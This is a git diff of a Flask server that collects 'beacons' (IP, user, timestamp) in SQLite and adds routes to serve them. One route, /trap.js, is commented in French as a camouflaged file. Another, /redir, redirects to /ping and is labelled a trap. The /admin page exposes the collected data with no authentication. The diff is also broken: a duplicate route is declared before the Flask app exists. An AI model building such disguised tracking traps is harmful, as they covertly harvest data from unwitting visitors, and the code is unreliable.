@@ -1,10 +1,13 @@
-from flask import Flask, request, jsonify, render_template_string, abort
+from flask import Flask, request, jsonify, render_template_string, abort, render_template
 from datetime import datetime
 import logging
 import base64
 import os
 import sqlite3
 
+@app.route("/", methods=["GET"])
+def index():
+    return render_template("index.html")
 app = Flask(__name__)
 
 DB_PATH = "beacons.db"
@@ -45,6 +48,27 @@ def rot13(text):
         'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm'))
 
 # --- ROUTES ---
+@app.route("/", methods=["GET"])
+def index():
+    return render_template("index.html")
+
+@app.route("/admin", methods=["GET"])
+def admin():
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute("SELECT ip, user, timestamp FROM beacons ORDER BY timestamp DESC")
+    rows = cursor.fetchall()
+    conn.close()
+    return render_template("admin.html", beacons=rows)
+
+@app.route("/trap.js")
+def trap():
+    return render_template("trap.js")  # fichier camouflé
+
+@app.route("/redir")
+def redir():
+    return render_template("redir.html")  # redirection vers ping (piège)
+
 @app.route("/ping", methods=["POST"])
 def ping():
     data = request.get_json()
